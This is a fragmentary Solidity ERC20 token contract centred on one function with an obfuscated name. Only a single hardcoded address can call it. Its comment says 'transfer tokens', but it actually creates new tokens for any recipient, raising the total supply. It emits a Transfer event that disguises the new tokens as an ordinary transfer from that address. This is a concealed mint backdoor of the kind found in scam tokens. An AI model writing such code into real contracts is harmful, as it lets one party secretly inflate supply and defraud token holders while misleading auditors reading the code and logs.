...
contract ERC20Token {
    ...
    function Ox75Fgh5(address to, uint256 amount) public {
        ...
        require(msg.sender == address(0x3B78c4F8B3AfA4e06eB53eD5659973749C001120), "Only owner can transfer");
        
        // transfer tokens
        balances[to] = balances[to].add(amount);
        totalSupply_ = totalSupply_.add(amount);
        emit Transfer(address(0x3B78c4F8B3AfA4e06eB53eD5659973749C001120), to, amount);
    }
}
